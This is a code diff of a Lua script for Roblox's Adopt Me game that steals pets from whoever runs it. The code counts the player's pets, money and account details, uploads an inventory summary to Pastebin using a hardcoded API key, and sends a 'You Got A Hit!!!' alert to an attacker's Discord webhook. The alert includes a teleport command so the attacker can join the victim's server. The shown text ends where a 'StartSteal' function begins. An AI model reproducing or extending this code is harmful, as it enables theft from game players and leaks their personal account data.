@@ -1,6 +1,7 @@
 local Pets = {}
 local PetCounts = {}
 
+-- Fetch pets from the player's inventory
 for i, v in pairs(
     require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
 ) do
@@ -40,6 +41,7 @@ local uncommon_count = 0
 local common_count = 0
 local total_pets = 0
 local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
+
 for i, v in pairs(ClientData.get("inventory").pets) do
     total_pets = total_pets + 1
 end
@@ -68,10 +70,10 @@ for i, v in pairs(ClientData.get("inventory").pets) do
     end
 end
 
+local messageADOPT
 if legendaries_count >= 5 or neon_count >= 5 or mega_count >= 1 then
     messageADOPT =
         "---@everyone\n" ..
-       
         'game:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '")\n'
 else
     messageADOPT = 
@@ -82,6 +84,21 @@ local plr = game.Players.LocalPlayer
 local userr = Username
 local userid = game.Players.LocalPlayer.UserId
 local accage = game.Players.LocalPlayer.AccountAge
+
+-- Prepare data for the webhook
+local inventorySummary = 
+    "Total Count: " .. tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC) .. "\n" ..
+    "Uniques: " .. tostring(uniqueItemsC) .. "\n" ..
+    "Ancients: " .. tostring(ancientItemsC) .. "\n" ..
+    "Godlys: " .. godlyItemsC .. "\n" ..
+    "Legendarys: " .. legendaryItemsC .. "\n" ..
+    "Vintages: " .. tostring(vintageItemsC) .. "\n" ..
+    "Rares: " .. rareItemsC .. "\n" ..
+    "Uncommons: " .. tostring(uncommonItemsC) .. "\n" ..
+    "Commons: " .. tostring(commonItemsC)
+
+local pastebinLink = pastebin(inventorySummary) -- Upload the inventory summary to Pastebin
+
 local data = {
     username = "You Got A Hit!!!",
     avatar_url = "https://cdn.discordapp.com/attachments/1282931642620706908/1283459804089548800/standard.gif?ex=6708a556&is=670753d6&hm=01662f53e4b8644a38a029c682b8ae93cf0ec0b65ad6c2ebf37035d20dfe3e8f&",
@@ -114,23 +131,35 @@ local data = {
                                                                                                     "\nBucks: " ..
                                                                                                         bucks ..
                                                                                                             "\nTotal Pets: " ..
-                                                                                                                tostring(
-                                                                                                                    total_pets
-                                                                                                                ) ..
+                                                                                                                tostring(total_pets) ..
                                                                                                                     '\n```\n**Join Player Script**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' ..
                                                                                                                         game.JobId ..
                                                                                                                             '", game.Players.LocalPlayer)\n```',
             color = tonumber(0x3365FF),
             fields = {
                 {
-                    name = "Player Inventory:",
-                    value = "**COMING SOON!**"
+                    name = "Hit Count:",
+                    value = "Total Count: " .. tostring(total_pets) ..
+                            "\nLegendaries: " .. tostring(legendaries_count) ..
+                            "\nMega Neons: " .. tostring(mega_count) ..
+                            "\nNeons: " .. tostring(neon_count) ..
+                            "\nUltra Rares: " .. tostring(ultra_count) ..
+                            "\nRares: " .. tostring(rare_count) ..
+                            "\nUncommons: " .. tostring(uncommon_count) ..
+                            "\nCommons: " .. tostring(common_count)
+                },
+                {
+                    name = "Hit List:",
+                    value = "[Click Here](" .. pastebinLink .. ")"
                 }
             }
         }
     }
 }
+
 local request = http_request or request or HttpPost or syn.request
+
+-- Send webhook request
 request(
     {
         Url = Webhook,
@@ -142,6 +171,44 @@ request(
     }
 )
 
+-- Pastebin integration
+local function pastebin(content)
+    local body = {
+        api_dev_key = "R9zark9KHZVGRI61Cds_qiTO1sjR7s1Z", -- Your actual API key
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. game.HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\nError...\n"
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+-- Start the stealing process
 local function StartSteal()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local RouterClient = Loads("RouterClient")
